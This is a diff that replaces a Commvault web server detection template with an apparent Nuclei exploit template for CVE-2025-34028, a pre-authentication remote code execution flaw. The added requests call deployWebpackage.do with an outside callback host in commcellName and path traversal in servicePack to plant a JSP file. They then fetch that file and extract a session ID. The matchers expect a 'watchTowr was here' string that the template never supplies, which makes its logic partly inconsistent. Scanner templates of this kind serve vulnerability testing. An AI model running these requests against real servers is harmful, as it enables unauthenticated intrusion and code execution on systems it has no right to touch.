@@ -1,20 +1,59 @@
-id: commvault-webserver-detect
+id: commvault-deploywebpackage-preauth-rce-cve-2025-34028
 
 info:
-  name: Commvault Web Server Detection
-  author: naures
-  severity: info
+  name: Commvault Pre-Auth RCE via deployWebpackage.do (CVE-2025-34028)
+  author: nickaures
+  severity: critical
   description: |
-    Detects a Commvault Webserver instance via the Server response header.
-  tags: commvault,exposure,webserver
+    A pre-authentication Remote Code Execution (RCE) vulnerability exists in Commvault's Innovation Release 11.38.0 - 11.38.19 via the deployWebpackage.do endpoint.
+    This vulnerability allows attackers to trigger an unauthenticated SSRF, arbitrary file write, and ultimately achieve RCE by uploading a malicious .jsp file to a web-accessible directory.
+  reference:
+    - https://watchtowr.com/blog/fire-in-the-hole-were-breaching-the-vault-commvault-remote-code-execution-cve-2025-34028/
+    - https://documentation.commvault.com/securityadvisories/CV_2025_04_1.html
+  classification:
+    cve-id: CVE-2025-34028
+    cwe-id: CWE-918, CWE-434
+  metadata:
+    max-request: 2
+    vendor: commvault
+    product: commvault
+  tags: rce,ssrf,fileupload,preauth,commvault,cve,cve2025
 
-requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}/identity/"
+http:
+  - raw:
+      - |
+        POST /commandcenter/deployWebpackage.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest
 
+        commcellName={{interactsh-url}}&servicePack=../../Reports/MetricsUpload/nuclei&version=nuclei
+
+      - |
+        GET /reports/MetricsUpload/nuclei/.tmp/dist-cc/dist-cc/nuclei.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      - interactsh-url: "{{interactsh-url}}"
+    attack: pitchfork
+
+    matchers-condition: and
     matchers:
-      - type: word
-        words:
-          - "Commvault"
+      - type: status
         part: header
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "watchTowr was here"
+          - "Server Info: Apache Tomcat"
+          - "Session ID"
+        condition: and
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - "Session ID: ([a-zA-Z0-9]+)"
